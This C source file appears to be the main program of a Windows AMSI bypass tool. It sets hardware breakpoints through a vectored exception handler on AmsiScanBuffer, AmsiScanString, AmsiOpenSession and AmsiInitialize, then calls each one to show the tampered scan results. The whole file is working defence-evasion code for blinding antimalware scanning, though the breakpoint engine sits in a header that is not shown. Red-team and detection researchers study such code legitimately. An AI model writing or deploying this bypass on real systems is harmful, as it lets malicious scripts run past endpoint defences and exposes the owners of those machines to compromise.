#include "HardwareBPEngine.h"

int main()
{

	HRESULT		 hRes		= NULL;
	AMSI_RESULT  AmsiResult	= 0;
	HAMSICONTEXT AmsiCtx	= NULL;
	PVOID		 AmsiDll	= NULL;
	PVOID		 Handler	= NULL;

	PVOID fnAmsiScanBuffer	= NULL;
	PVOID fnAmsiScanString	= NULL;
	PVOID fnAmsiOpenSession = NULL;
	PVOID fnAmsiInitialize	= NULL;

	AmsiDll = LoadLibraryW(L"Amsi.dll");

	fnAmsiScanBuffer	= GetProcAddress(AmsiDll, "AmsiScanBuffer");
	fnAmsiScanString	= GetProcAddress(AmsiDll, "AmsiScanString");
	fnAmsiOpenSession	= GetProcAddress(AmsiDll, "AmsiOpenSession");
	fnAmsiInitialize	= GetProcAddress(AmsiDll, "AmsiInitialize");

	if (!(Handler = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)InitializeHardwareBPEngine)))
	{
		PRINT_ERROR("AddVectoredExceptionHandler");
		return 1;
	}

	INFO("[0x%p] AmsiScanBuffer Address", fnAmsiScanBuffer);

	SetHardwareBreakpoint(fnAmsiScanBuffer);

	INFO("[0x%p] AmsiScanString Address", fnAmsiScanString);

	SetHardwareBreakpoint(fnAmsiScanString);

	INFO("[0x%p] AmsiOpenSession Address", fnAmsiOpenSession);

	SetHardwareBreakpoint(fnAmsiOpenSession);

	INFO("[0x%p] AmsiInitialize Address", fnAmsiInitialize);

	SetHardwareBreakpoint(fnAmsiInitialize);

	// some Amsi functions to test and see the return value

	// order does matter, because of my garbage code, AmsiScanBuffer (or any Amsi function that uses AmsiResult) must go first
	// the code crashes if another Amsi function (which does not use AmsiResult) is called first

	hRes = AmsiScanBuffer(NULL, NULL, 0, NULL, NULL, &AmsiResult);
	INFO("AmsiScanBuffer Result: %s", GetAmsiResultValue(AmsiResult));

	hRes = AmsiInitialize(L"Test", NULL);
	INFO("AmsiInitialize Result: %d", hRes);

	hRes = AmsiOpenSession(NULL, NULL);
	INFO("AmsiOpenSession Result: %d", hRes);

	hRes = AmsiScanString(NULL, NULL, NULL, NULL, &AmsiResult);
	INFO("AmsiScanString Result: %s", GetAmsiResultValue(AmsiResult));

	RemoveHardwareBreakpoint();

	OKAY("Done!");

	CHAR("Quit...");
	getchar();

	return 0;

}